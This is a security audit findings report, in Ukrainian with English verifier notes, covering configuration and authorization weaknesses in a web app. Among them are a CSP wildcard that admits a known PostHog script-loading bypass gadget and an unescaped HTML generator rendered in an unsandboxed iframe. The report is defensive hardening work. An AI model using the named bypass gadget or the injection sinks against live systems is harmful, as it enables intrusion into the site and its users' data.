### [info] Латентний ризик: VITE_INTERNAL_API_KEY (bearer для /api/internal/*) вшивається в браузерний бандл, якщо змінну колись задати

- **ID:** `client-static/landing-shell-mobile#10` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Де:** apps/web/src/shared/lib/api/internalFetch.ts:39-62; apps/web/src/pages/strategy/StrategyPage.tsx:24-33 (@nextStep — змонтувати /strategy у router); apps/web/vite.config.js (жодного guard-а)
- **Вплив:** Якщо StrategyPage змонтують за @nextStep і хтось виставить VITE_INTERNAL_API_KEY у Vercel env, n8n-PAT для /api/internal/* (GDPR, mono, webhook replay) опиниться в публічному JS. Від повного доступу до internal API тоді відділяє лише requireInternalIp.
- **Що зробити:** Додати у vite.config.js fail-fast: кидати помилку, якщо mode=production або VERCEL=1 і заданий VITE_INTERNAL_API_KEY. Довгостроково перевести strategic UI на звичайну сесійну авторизацію з роллю founder замість m2m-ключа.

**Докази:**

```text
`const key = import.meta.env["VITE_INTERNAL_API_KEY"]; … headers.set("Authorization", `Bearer ${key}`)`. Коментар: «Exposing it to the browser is acceptable ONLY in dev … In prod builds VITE_INTERNAL_API_KEY is unset». Механічного enforcement немає: ні vite.config, ні скрипти, ні правило #20 (воно перевіряє лише OPENCLAW_GITHUB_PAT/Git_PAT на сервері). Поточний білд чистий: рядка internal_api_key_missing у apps/server/dist немає (tree-shaken, бо StrategyPage не змонтована).
```

**Відтворення:**

```text
grep -rl internal_api_key_missing apps/server/dist → порожньо; прочитати internalFetch.ts.
```

**Верифікатор:**

```text
The code facts check out. internalFetch.ts:39 reads `import.meta.env["VITE_INTERNAL_API_KEY"]`, and line 63 sets `Authorization: Bearer ${key}`. There is no fail-fast in apps/web/vite.config.js, and no lint or script guards the variable (it is grep-clean outside docs and tests). internalFetch and StrategyPage have no importers in apps/web/src, so the current bundle is clean (tree-shaken). The risk is latent, though, and I would downgrade it. It needs two future actions, mounting /strategy and setting the variable in Vercel, and the latter is explicitly forbidden in docs/engineering/integrations/env-vars.md ('Ніколи не задавати у прод-білді') and docs/work/specs/beta-launch/run-beta-wave.md:421. The impact is also overstated. Besides requireInternalIp (mounted only when INTERNAL_ALLOWED_IPS is set), /api/internal/* also runs verifyWebhookSignature, which by default requires an HMAC signature (`WEBHOOK_HMAC_REQUIRED` default true) whenever `WEBHOOK_HMAC_SECRET` is set. A leaked bearer alone is then not enough, and the browser helper does not sign, so it would not even work in such a prod. A build-time guard is still a cheap, reasonable hardening step. This is info, not low.
```

**Додаткові докази верифікатора:**

```text
apps/server/src/routes/internal/index.ts:24-60 lists the layers: optional IP allowlist, a rate limit of 120/min, a constant-time bearer check, and an HMAC verifier when the secret is set. apps/server/src/env/env.ts:493 has `WEBHOOK_HMAC_REQUIRED: boolFromEnv(true)`. `grep -rn 'StrategyPage|internalFetch' apps/web/src` finds no non-test importers. env-vars.md § `VITE_INTERNAL_API_KEY` (dev-only) documents the prohibition.
```

### [info] Прод публічно віддає sw.js.map: Sentry-видалення мап не покриває окремий injectManifest-білд

- **ID:** `client-static/landing-shell-mobile#12` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/vite.config.js:150-151 (VitePWA strategies: injectManifest), :316-318 (filesToDeleteAfterUpload), :340 (sourcemap: hidden)
- **Вплив:** Репо публічне, тож нових секретів це не розкриває. Але це розбіжність із наміром «Map-файли видаляються, щоб не серватись публічно», і ознака того, що інший пізній артефакт так само проскочить повз видалення.
- **Що зробити:** Вимкнути sourcemap для injectManifest-білду (injectManifest.rollupOptions / buildPlugins) або видаляти dist/**/*.map окремим постбілд-кроком після VitePWA.

**Докази:**

```text
`GET https://app.sergeant.com.ua/assets/index-vHbodugH.js.map -> 404` (мапи чанків видалено коректно), але `GET https://app.sergeant.com.ua/sw.js.map -> 200 {"version":3,"file":"sw.mjs",…}`. Локальний dist теж містить sw.js.map (260 KB).
```

**Відтворення:**

```text
node <scratch>/agents/client-static-landing-shell-mobile/hdrs.mjs https://app.sergeant.com.ua/sw.js.map
```

**Верифікатор:**

```text
Reproduced live: GET https://app.sergeant.com.ua/sw.js.map returns 200 with `{"version":3,"file":"sw.mjs",...}`. sw.js itself has no sourceMappingURL comment, so the map is only reachable by guessing the URL. The local build matches: apps/server/dist/sw.js.map is 260 KB with sourcesContent, including apps/web/src/sw.ts and src/sw/*.ts. vite.config.js:316-318 configures the Sentry plugin with `filesToDeleteAfterUpload: ["**/*.js.map","**/*.mjs.map"]`, and the comment states the intent that 'Map-файли видаляються ... щоб не серватись публічно'. The injectManifest SW is built in a separate VitePWA build that the main-bundle deletion does not cover. The repo is public, so this exposes nothing new. It is an intent-vs-reality gap only, and info severity is right.
```

**Додаткові докази верифікатора:**

```text
Verifier hdrs.mjs: app.sergeant.com.ua/sw.js.map 200 (body begins with workbox-core sources). Non-node_modules sources in the local map: ../../web/src/sw/{version,cachePolicy,offlineFallback,cache,notifiedKeys,debug,messages,pushPayload}.ts and ../../web/src/sw.ts. No doc or audit mentions sw.js.map.
```

### [info] Прод віддає assetlinks.json і apple-app-site-association з плейсхолдерами REPLACE_WITH_…

- **ID:** `client-static/landing-shell-mobile#7` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Уже відстежується:** docs/work/specs/launch/phases/02-capacitor-launch.md:830
- **Де:** apps/web/public/.well-known/assetlinks.json:7,15-17; apps/web/public/.well-known/apple-app-site-association:6-7; споживачі: apps/mobile-shell/android/app/src/main/AndroidManifest.xml:63-67 (autoVerify=true), apps/mobile/app.config.ts (associatedDomains, autoVerify)
- **Вплив:** Верифікація App Links і Universal Links для всіх хостів провалиться, і https-лінки не відкриватимуть застосунок. Публічно видно незавершену конфігурацію. Мобільний контур на паузі, тож прямої шкоди зараз немає.
- **Що зробити:** Не публікувати плейсхолдери: прибрати файли з public до релізу або підставляти значення на білді з секретів чи vars і падати, якщо лишився рядок REPLACE_WITH.

**Докази:**

```text
GET https://app.sergeant.com.ua/.well-known/assetlinks.json -> 200: `"sha256_cert_fingerprints": ["REPLACE_WITH_SHA256_FROM_SIGNING_KEYSTORE"]`, `"REPLACE_WITH_SHA256_FROM_EAS_PRODUCTION_KEYSTORE"`; AASA -> `"appIDs": ["REPLACE_WITH_TEAM_ID.com.sergeant.shell", "REPLACE_WITH_TEAM_ID.com.sergeant.app"]`. Відомий відкритий пункт: docs/work/specs/launch/phases/02-capacitor-launch.md:830 «[ ] AASA + assetlinks.json deploy-нуті».
```

**Відтворення:**

```text
BODY=600 node <scratch>/agents/client-static-landing-shell-mobile/hdrs.mjs https://app.sergeant.com.ua/.well-known/assetlinks.json https://app.sergeant.com.ua/.well-known/apple-app-site-association
```

**Верифікатор:**

```text
Факт підтверджено: https://app.sergeant.com.ua/.well-known/assetlinks.json і apple-app-site-association віддають 200 з REPLACE_WITH_SHA256_FROM_SIGNING_KEYSTORE, REPLACE_WITH_SHA256_FROM_EAS_PRODUCTION_KEYSTORE і REPLACE_WITH_TEAM_ID.*. Це задокументований незавершений крок: docs/engineering/mobile/capacitor-deep-links.md:86,148 описує заміну плейсхолдерів, а чекліст запуску має відкритий пункт. Мобільних застосунків немає (ADR-0094), тож верифікацію нікому провалювати, і плейсхолдер не відкриває жодного вектора атаки. Severity знизив з low до info.
```

**Додаткові докази верифікатора:**

```text
hdrs.mjs підтвердив тіла обох файлів на проді. Плейсхолдери описані в capacitor-deep-links.md:86 і :148 як ручний крок перед релізом.
```

### [info] Дрейф allowlist-ів нативних deep-link: мертві /help,/coach,/oauth,/design; бракує /verify-email,/settings,/legal/*,/capabilities,/insights,/onboarding; web відкидає `/?query`, який shell пропускає

- **ID:** `client-static/web-route-guards#9` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Де:** apps/web/src/core/app/ShellDeepLinkBridge.tsx:31-67; apps/mobile-shell/src/index.ts:72-91,124-150
- **Вплив:** У нативній оболонці App Links на верифікацію email, повернення з оплати/Silpo і юридичні сторінки мовчки відкидаються; два «джерела правди» вже розійшлися. Мобільний контур на паузі (ADR-0094), але баг-фікси дозволені.
- **Що зробити:** Генерувати обидва allowlist-и з одного джерела (STANDALONE_ROUTE_PATHS + PATH_BASED_MODULE_IDS + redirect-only префікси), вирівняти обробку `/?query`, прибрати мертві префікси.

**Докази:**

```text
Обидва списки містять `/help`, `/coach`, `/oauth` (у вебі 404) і `/design` (dev-only, у проді 404), але не містять `/verify-email`, `/settings` (повернення з білінгу `?billing=` та Silpo OAuth `?silpo=`), `/insights`, `/legal/*`, `/capabilities`, `/onboarding`; shell-список ще й без `/status`. Shell `isSafeShellPath` приймає `/?x=1`, а web `isSafeNavPath` — лише точний `/` (рядок 55), тож `com.sergeant.shell://?module=finyk&action=add_expense` (форма PWA-шорткатів) shell пропускає, а web-міст відхиляє з warn.
```

**Відтворення:**

```text
Статичне читання двох allowlist-ів; перевірити: isSafeNavPath("/?module=finyk") === false, isSafeShellPath("/?module=finyk") === true.
```

**Верифікатор:**

```text
Статично підтверджено. ShellDeepLinkBridge.tsx:31-49 і mobile-shell/src/index.ts:72-91 — дві незалежні копії списку. Обидві містять /help, /coach, /oauth: у вебі для них немає ні standalone-маршрутів, ні модулів (HUB_MODULE_IDS = finyk/fizruk/routine/nutrition). /design у проді дає 404. В обох списках немає /verify-email, /settings, /insights, /onboarding, /capabilities, /legal/*, у shell-списку немає й /status. Сервер повертає з білінгу на `${app}/settings?billing=manage` (liqpay.ts:425, plata.ts:327). Web isSafeNavPath приймає лише точний `/`, тоді як shell isSafeShellPath приймає `/?…` і `/#…`, а PWA-шорткати мають форму `/?module=finyk&action=add_expense` (vite.config.js:193). Коментар shell стверджує, що веб викликає isSafeShellPath, але насправді там власна копія. Severity знижено до info: за ADR-0094 обидва мобільні стеки на паузі, і застосунки запускають лише після того, як web доведе потрібність продукту. Shell зараз не має користувачів, тож вплив у проді нульовий.
```

**Додаткові докази верифікатора:**

```text
Нативна сторона: parseDeepLink → isSafeShellPath (index.ts:297-336). Веб: isSafeNavPath з `if (path === "/") return true;` (ShellDeepLinkBridge.tsx:55), без гілки для `/?`. StandaloneRoutes.tsx не має записів для /help, /coach, /oauth. /auth це alias, що редиректить на /sign-in, тому він валідний.
```

### [info] `generatePDFReport` / `dataToHTMLTable` збирають HTML без екранування і рендеряться в same-origin `&lt;iframe srcDoc&gt;` без `sandbox`

- **ID:** `client-static/web-xss-injection#7` · **Вердикт:** підтверджено · **Категорія:** `xss` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Де:** apps/web/src/shared/lib/ui/export.ts:207-370 (title/subtitle/section.title/footerText/logo, комірки таблиці); apps/web/src/shared/lib/index.ts:149-153 (публічний ре-експорт); apps/web/src/core/hub/PdfPreviewModal.tsx:103-108
- **Вплив:** Пастка для наступного виклику: варто передати в dataToHTMLTable назви операцій чи звичок, і вийде HTML-ін'єкція в same-origin документ. Inline-скрипти в проді блокує успадкований CSP (srcdoc наслідує політику), але форми, фішингові лінки й `&lt;meta refresh&gt;` спрацюють.
- **Що зробити:** Екранувати всі інтерполяції всередині генератора, а не покладатися на викликача. Видалити невживаний `dataToHTMLTable` або екранувати в ньому комірки. Додати iframe `sandbox="allow-modals allow-same-origin"` (потрібно для print) без allow-scripts.

**Докази:**

```text
`<h1>${title}</h1>`, `<img src="${logo}"…>`, `${typeof section.content === "string" ? section.content : section.content.outerHTML}`, а в dataToHTMLTable `return `<td>${value ?? ""}</td>``. Жодного escape. Iframe: `<iframe ref={iframeRef} title=… srcDoc={html} …/>` без атрибута sandbox, тобто документ має повний доступ до origin застосунку. Єдиний поточний виклик (HubReports.tsx:181-224) сам екранує `<`,`&`,`>` у вставлених рядках, а `dataToHTMLTable` зараз не викликається ніде.
```

**Відтворення:**

```text
Статично: grep `generatePDFReport|dataToHTMLTable`. Поточні дані інсайтів екрануються, тому живого експлойта немає.
```

**Верифікатор:**

```text
Опис коду точний. generatePDFReport і dataToHTMLTable (export.ts:207-370) інтерполюють title/subtitle/logo/section.title/content/footer і комірки без екранування, а PdfPreviewModal.tsx:103-108 рендерить `<iframe srcDoc={html}>` без sandbox. Живого вектора немає. Єдиний виклик (HubReports.tsx:204) екранує insight-рядки через esc(), subtitle — це label з formatPeriodLabel(period, offset), тобто значення рушія. dataToHTMLTable ніде не викликається, є лише ре-експорт у shared/lib/index.ts:150. Inline-скрипти в srcdoc успадковують CSP батька. Тому це латентна пастка, а не вразливість. Severity знижено до info.
```

**Додаткові докази верифікатора:**

```text
grep generatePDFReport|dataToHTMLTable: є лише HubReports.tsx:14/204, ре-експорт index.ts:150,153 і визначення. HubReports.tsx:135 `const label = formatPeriodLabel(period, offset);`.
```

### [info] CSP `script-src` дозволяє wildcard `https://*.posthog.com` (і `*.sentry.io`), тобто домени, які роздають JS, налаштований будь-яким клієнтом PostHog

- **ID:** `client-static/web-xss-injection#8` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/vercel.json (headers → Content-Security-Policy); apps/landing/vercel.json (script-src 'self' https://*.posthog.com)
- **Вплив:** Якщо колись з'явиться HTML-ін'єкція, CSP її не зупинить: атакувальник підключить свій скрипт із дозволеного домену PostHog. Зараз прямого впливу немає.
- **Що зробити:** Звузити до конкретних хостів (наприклад, `https://eu-assets.i.posthog.com`) або проксувати PostHog через власний домен і заборонити remote config/site apps. Те саме зробити для `*.sentry.io`: потрібен лише конкретний ingest у connect-src, а не в script-src.

**Докази:**

```text
Enforced: `script-src 'self' 'wasm-unsafe-eval' https://*.posthog.com https://*.sentry-cdn.com https://*.sentry.io https://js.sentry-cdn.com`. PostHog роздає зі своїх доменів config/site-app JS для будь-якого project token, тобто код, який задає власник іншого проєкту. Це відомий gadget для обходу CSP: `<script src="https://us.i.posthog.com/...">`.
```

**Відтворення:**

```text
Статично (read vercel.json). Вразливого sink-а для HTML-ін'єкції в apps/web не знайдено, тому це лише послаблення другої лінії оборони.
```

**Верифікатор:**

```text
The configuration part is correct. `apps/web/vercel.json` sends an enforced `Content-Security-Policy` with `script-src 'self' 'wasm-unsafe-eval' https://*.posthog.com https://*.sentry-cdn.com https://*.sentry.io https://js.sentry-cdn.com`. The Report-Only header carries the same hosts plus `'unsafe-inline'`. `apps/landing/vercel.json` has `script-src 'self' https://*.posthog.com`. The `<meta>` fallback in `apps/web/index.html` matches.

The wildcards are intentional. They come from `docs/work/specs/security-hardening/C2-frontend-csp.md` (Phase 2 enforce policy), and `apps/web/src/test/cspMonitoringAllowlist.test.ts` requires them in `REQUIRED_SCRIPT_SRC`. However, the spec's stated reason (the PostHog "script-бандл") does not need a wildcard.

The code shows these allowances are wider than the app uses:
(1) Sentry is bundled from npm (`@sentry/react` ^8.55.1). There is no `lazyLoadIntegration`, Loader Script or `sentry-cdn` reference anywhere in `apps/web/src`, so all three Sentry script-src entries are unused attack surface.
(2) The app bundles posthog-js 1.399.2 with `api_host` = `https://eu.i.posthog.com`. Its request router maps that to assets host `https://eu-assets.i.posthog.com`, so lazy extensions (`/static/*.js`) and remote config (`/array/<token>/config.js`) come only from that one host. `opt_in_site_apps` is not set, so site apps never load from the api host. Narrowing to `https://eu-assets.i.posthog.com` is therefore feasible.

The finding overstates one point: it calls `<script src=https://*.posthog.com/...>` a ready one-step bypass. PostHog's `/array/<token>/config.js` serves code chosen by whoever owns that project, but that code sits inside `init` functions that run only when an SDK instance with `opt_in_site_apps` calls them. I did not reproduce an actual CSP bypass, and it would still need an HTML-injection sink, which nobody has found.

So this is a real defense-in-depth weakness: wildcard allowlists over multi-tenant third-party domains, part of them unused. Severity stays info, with no direct exploit. A fix must also update `cspMonitoringAllowlist.test.ts` (`REQUIRED_SCRIPT_SRC`) and the `index.html` meta fallback, or the L11 test will fail.
```

**Додаткові докази верифікатора:**

```text
- `apps/web/vercel.json`, enforced `Content-Security-Policy`: `script-src 'self' 'wasm-unsafe-eval' https://*.posthog.com https://*.sentry-cdn.com https://*.sentry.io https://js.sentry-cdn.com`.
- `apps/landing/vercel.json`: `script-src 'self' https://*.posthog.com`.
- `apps/web/src/test/cspMonitoringAllowlist.test.ts:139-145` enforces `REQUIRED_SCRIPT_SRC = ['self', https://*.posthog.com, https://*.sentry-cdn.com, https://*.sentry.io, https://js.sentry-cdn.com]`.
- Grepping `apps/web/src` and `apps/landing/src` for `sentry-cdn|lazyLoadIntegration|opt_in_site_apps|disable_external_dependency_loading` gives 0 hits, so no Sentry CDN loading and site apps stay off.
- `node_modules/posthog-js` (1.399.2) `dist/module.js`: assets URL is `"https://"+this.region+"-assets."+"i.posthog.com"`. Remote config is `endpointFor("assets","/array/"+token+"/config.js")`. Site apps run only `if(this.isEnabled)` = `config.opt_in_site_apps`.
- `apps/web/src/core/observability/posthog.ts:236-244`: `api_host` defaults to `https://eu.i.posthog.com`.
- Landing (`apps/landing/src/lib/analytics.ts:46-50`) uses the same npm SDK and host.
- `connect-src` also allows `https://*.posthog.com` and `https://*.sentry.io` / `*.ingest.sentry.io`. That is a separate, already accepted exfil channel into an attacker's own PostHog or Sentry project.
- No prior audit in `docs/work/specs/audits/**` or `docs/open-work.md` records this. The C2 spec is the source of the policy, not a tracking entry for the weakness.
```

### [info] /api/transcribe віддає клієнту сирий текст помилки Groq (до 500 символів тіла upstream)

- **ID:** `server-static/ai-layer#10` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Серйозність від шукача:** low (переоцінено верифікатором)
- **Де:** apps/server/src/lib/groq.ts:142-161; apps/server/src/modules/transcribe/transcribe.ts:176-189
- **Вплив:** Витік деталей облікового запису провайдера (ідентифікатор організації, ліміти) і внутрішніх повідомлень у UI; користувач бачить сирий JSON замість зрозумілого тексту.
- **Що зробити:** Віддавати клієнту генеричний український текст, а detail лишати в лозі/метриці, як у makeAiProviderError.

**Докази:**

```text
groq.ts: `detail = (await response.text()).slice(0, 500); throw new GroqTranscribeError(`Groq повернув ${response.status}${detail ? `: ${detail}` : ""}`, ...)`; transcribe.ts:184 `res.status(err.status).json({ error: err.message, code: "TRANSCRIBE_UPSTREAM_FAILED", ... })`. Для чату ця політика прямо заборонена (B33/B46: «сирий провайдерний рядок назовні не йде ніколи»).
```

**Відтворення:**

```text
Статично. У проді при 429 від Groq клієнт отримає щось на кшталт `Groq повернув 429: {"error":{"message":"Rate limit reached for model ... in organization org_... on audio seconds per hour..."}}`.
```

**Верифікатор:**

```text
The code matches the finding. groq.ts:142-161 builds the message as `Groq повернув ${status}: ${detail}` with up to 500 chars of the upstream body. transcribe.ts:184 returns err.message in the `error` field of the JSON. But the claimed user impact is wrong. packages/api-client/src/endpoints/transcribe.ts maps each non-ok status to an outcome, and useGroqVoiceInput.ts:140-181 shows fixed UA text for every outcome: 429 gives 'Забагато голосових запитів...' and 'error' gives 'Не вдалося розпізнати запис...'. result.message is used only for 403 health consent. So the user never sees raw JSON. What remains is that a Pro user (requirePlan pro, voice UI flag currently off) can see the Groq org id and rate-limit details in the network tab. These are operator metadata, not secrets. The API key is never echoed. It is inconsistent with the B33/B46 policy for chat, but the practical risk is negligible.
```

**Додаткові докази верифікатора:**

```text
useGroqVoiceInput.ts:170-181 ('rate_limited' -> fixed copy, 'error' -> fixed copy); api-client transcribe.ts:88-121 status->outcome mapping; transcribe.ts:176-188 logs only status/outcome, response includes err.message.
```

### [info] RLS відсутній повністю: 0 політик, relrowsecurity=false на всіх 161 таблицях

- **ID:** `server-static/db-migrations#10` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/rls-ai-tables-and-isolation-gate.md
- **Де:** apps/server/src/migrations/* (жодного ENABLE ROW LEVEL SECURITY/CREATE POLICY); apps/server/src/dbContext.ts:17-18; docs/work/specs/rls-ai-tables-and-isolation-gate.md
- **Вплив:** Ізоляція тенантів тримається лише на ручних `WHERE user_id = $1` у коді; другої лінії оборони в БД ще немає (відомо, у роботі).
- **Що зробити:** Завершити стадію 4 спеки (політики USING/WITH CHECK на AI-таблицях, роль без BYPASSRLS, FORCE ROW LEVEL SECURITY) і поширити на sync_op_log та модульні таблиці.

**Докази:**

```text
`select count(*) from pg_policies` -> 0; усі таблиці в pg_class мають relrowsecurity=f. dbContext.ts: «Поки політик RLS немає, helper не змінює поведінку: параметри app.user_id і app.bypass ніхто не читає». Спека в статусі «In progress (Стадії 1-3 з 4)».
```

**Відтворення:**

```text
psql -c 'select count(*) from pg_policies'; запит relrowsecurity по pg_class.
```

**Верифікатор:**

```text
Відтворено. `select count(*) from pg_policies` дає 0. У pg_class для public: relrowsecurity=f на всіх 160 таблицях (у звіті 161, різниця не суттєва). grep 'ROW LEVEL SECURITY|CREATE POLICY' по migrations нічого не знаходить. dbContext.ts:17-18 прямо пише, що параметри app.user_id і app.bypass поки ніхто не читає. Це відомий і запланований стан: спека docs/work/specs/rls-ai-tables-and-isolation-gate.md має статус 'In progress (Стадії 1-3 з 4)' і внесена в docs/open-work.md:93, а ADR-0012 лишається Proposed. Нового в знахідці немає, severity info.
```

**Додаткові докази верифікатора:**

```text
docs/open-work.md:93 містить рядок rls-ai-tables-and-isolation-gate.md, In progress (Стадії 1-3 з 4). Спека прямо описує відсутність політик і грепу з нулем збігів.
```

### [info] Дрейф мажорної версії Postgres: CI/dev pg17, прод pg18 (за доками)

- **ID:** `server-static/db-migrations#11` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md
- **Де:** .github/workflows/ci.yml:809,1229; .github/workflows/db-backup-verify.yml:36-42; docs/start/instructions/database-backup-restore.md:19,252; docs/operations/observability/pg-pool-sizing.md:65
- **Вплив:** Міграції й відновлення бекапу ніколи не перевіряються на мажорі проду; поведінкові відмінності pg18 можуть виявитись лише під час деплою чи відновлення.
- **Що зробити:** Підтвердити версію проду і вирівняти CI/compose/backup-verify на неї (або явно зафіксувати pg17 у проді).

**Докази:**

```text
Усі CI-гейти міграцій (critical-flow, migration-down-drill) і docker-compose на `pgvector/pgvector:pg17`; доки кажуть прод = `pgvector/pgvector:pg18`; щотижнева перевірка бекапу відновлює pg18-дамп у pg17 («мажорний downgrade, сумісність не гарантована»). Бриф аудиту називає прод PG17 — джерела суперечать одне одному. PG17/18-only синтаксису в міграціях не знайдено (усі 153 застосовано на локальному PG16).
```

**Відтворення:**

```text
grep pg17/pg18 по .github і docs.
```

**Верифікатор:**

```text
Підтверджено grep-ом. ci.yml:809 і :1229, extended-e2e.yml:55, db-backup-verify.yml:42 і docker-compose.yml:30 запінено на `pgvector/pgvector:pg17@sha256:feb68…`. database-backup-restore.md:7,19,89,252,264 і pg-pool-sizing.md:65 кажуть, що прод на `pgvector/pgvector:pg18`. Коментар db-backup-verify.yml:36-40 сам визнає мажорний downgrade pg18 -> pg17 і пише 'Tracked separately', проте ADR-0074 на який посилаються, мажорної версії не називає (grep pg17/pg18 у ADR порожній). Бриф аудиту каже PG17, тож джерела справді суперечать одне одному. Дрейф уже зафіксовано як 'задокументований' в docs/work/specs/audits/security-comprehensive-2026-08-04.md:267. Окремого відкритого пункту в open-work або tech-debt немає. Несумісного з pg17/18 синтаксису не знайдено. Severity info.
```

**Додаткові докази верифікатора:**

```text
Неперевірене спостереження: db-backup-verify.yml викликає `pg_dump` клієнта, вбудованого в ubuntu-latest, без пінування версії. Якщо мажор клієнта нижчий за мажор проду, pg_dump відмовиться працювати (server version mismatch), і щотижнева перевірка бекапу впаде ще до кроку restore. Варто звірити з останніми прогонами workflow.
```

### [info] Hard Rule #4: лінт ловить лише DROP COLUMN/TABLE, ALLOW_DROP досі дозволяє оминути 14-денне вікно

- **ID:** `server-static/db-migrations#9` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** scripts/lint-migrations.mjs:22-23, 117-119; apps/server/src/migrations/133_plata_subscription.sql:22,36; 140_fizruk_pushups_to_workouts.sql:38,138
- **Вплив:** Двофазність фактично опціональна; при міграціях з ENTRYPOINT (старий контейнер працює на новій схемі) неперевірені деструктивні DDL можуть ламати старий код у вікні деплою.
- **Що зробити:** Заборонити ALLOW_DROP для нових номерів (&gt; 152), вимагати TWO-PHASE-DROP; розширити лінт на RENAME/ALTER TYPE/SET NOT NULL/DROP CONSTRAINT із тим самим escape-hatch.

**Докази:**

```text
Нумерація 001-152: прогалин немає, дубль лише 091 (задокументований whitelist APPLIED_DUPLICATE_FILENAMES). Без .down: 001-005, 007, 011, 034 (легасі). DROP_RE = /\bDROP\s+(COLUMN|TABLE)\b/ — DROP CONSTRAINT, ALTER COLUMN TYPE, RENAME, деструктивний DELETE даних (141, 144) не перевіряються. Легасі-хетч `-- ALLOW_DROP:` (будь-яка причина) використано у вересні 2026 у 133 і 140, щоб зробити DROP TABLE без фази депрекації, хоча коментар лінта каже «New migrations should use TWO-PHASE-DROP».
```

**Відтворення:**

```text
Перелік файлів і grep DROP з заголовками (виконано скриптом у scratch-каталозі агента).
```

**Верифікатор:**

```text
Підтверджено в коді. scripts/lint-migrations.mjs:22 `DROP_RE = /\bDROP\s+(COLUMN|TABLE)\b/i`: RENAME, ALTER COLUMN TYPE, SET NOT NULL, DROP CONSTRAINT і деструктивний DELETE не перевіряються. :23 і :125-127: `-- ALLOW_DROP: <будь-яка непорожня причина>` досі проходить для будь-якого номера. Правило 4 (docs/governance/governance/rules/04-…md) каже, що ALLOW_DROP лишається 'for backward-compat with pre-existing migrations', а нові міграції 'should use TWO-PHASE-DROP'. Отже лінт не забезпечує заявленої політики. ALLOW_DROP знайдено в 046, 059.down, 133 і 140. 133 і 140 узяли хетч у вересні 2026 свідомо: є задокументовані рішення власника і обґрунтування безпеки даних (plata_card_token гарантовано порожня, бо PLATA_ENABLED=false від народження; fizruk_pushups конвертується в тому ж statement), запис у docs/work/specs/tech-debt/backend.md:678-694. Нумерацію перевірено: 001-152 без прогалин, єдиний дубль 091 (whitelist за іменами файлів), без .down рівно 001-005, 007, 011, 034. Severity info: поки обхід завжди був свідомим і задокументованим, це прогалина в enforcement, а не інцидент. Додатково варто знати, що й TWO-PHASE-DROP заголовок самодекларативний: лінт перевіряє лише арифметику дат, не факт фази 1.
```

**Додаткові докази верифікатора:**

```text
У 140 старий контейнер у вікні деплою (міграція в ENTRYPOINT нового образу) ще міг приймати sync-op у fizruk_pushups і падати на відсутній таблиці. Нові клієнти відхиляють такі op як unsupported_table, але це логіка нового сервера. Ризик короткочасний і відомий власнику.
```

### [info] Стан RLS: у базі жодної політики, авторизація повністю в коді застосунку, а гейт ізоляції покриває малу частину роутів

- **ID:** `server-static/idor-rls#4` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/rls-ai-tables-and-isolation-gate.md
- **Де:** apps/server/src/dbContext.ts:17-18; apps/server/src/migrations/ (0 збігів ROW LEVEL SECURITY/CREATE POLICY); apps/server/src/http/crossUserIsolation.test.ts:168-243
- **Вплив:** Будь-який майбутній хендлер, що забуде `WHERE user_id = $1`, віддасть чужі дані: база цього не заборонить. Механічний гейт ловить пропуск лише в 12 покритих кейсах. Фактичних пропусків у поточному коді в межах цього огляду не знайдено, але sync push (найбільша поверхня) гейтом не покритий, і саме там знайдено проблему з глобальними id.
- **Що зробити:** Пріоритезувати покриття гейтом sync push/pull, finyk/receipts/:id, import/batches/:id і silpo receipts. Стадію 4 робити лише після виправлення ролі БД (див. окрему знахідку). Не посилатися на withUserContext як на ізоляцію, доки політик немає.

**Докази:**

```text
psql: `SELECT relname, relrowsecurity, relforcerowsecurity FROM pg_class WHERE relrowsecurity OR relforcerowsecurity` -> 0 rows; `SELECT count(*) FROM pg_policies` -> 0. dbContext.ts: «Поки політик RLS немає, helper не змінює поведінку: параметри `app.user_id` і `app.bypass` ніхто не читає». Спека: «4. A1-A3 міграція з політиками | Не почато». TODO_UNCOVERED у гейті містить ~70 user-scoped роутів, зокрема `POST /api/v2/sync/push`, `GET /api/v2/sync/pull`, усі /api/finyk, /api/mono, /api/silpo, /api/nutrition, /api/push і /api/billing.
```

**Відтворення:**

```text
psql postgresql://hub:hub@127.0.0.1:5432/hub -c "SELECT count(*) FROM pg_policies"; grep -rE 'ROW LEVEL SECURITY|CREATE POLICY' apps/server/src/migrations
```

**Верифікатор:**

```text
Факти точні: `SELECT count(*) FROM pg_policies` дає 0; таблиць з relrowsecurity/relforcerowsecurity теж 0; у міграціях 0 збігів ROW LEVEL SECURITY/CREATE POLICY. У TODO_UNCOVERED 72 роути, серед них POST /api/v2/sync/push, GET /api/v2/sync/pull і всі /api/silpo/*. Але це задокументований і відстежуваний стан, а не нова знахідка. ADR-0012 (Accepted) свідомо обирає авторизацію в застосунку. Спека позначає Стадію 4 як «Не почато». dbContext.ts прямо пише, що helper поки не змінює поведінку. Сам тест вимагає, щоб TODO_UNCOVERED «лише скорочувався». Нового дефекту тут немає. Корисне лише те, що sync push не покритий гейтом, а саме там знайдено #1 і #5.
```

**Додаткові докази верифікатора:**

```text
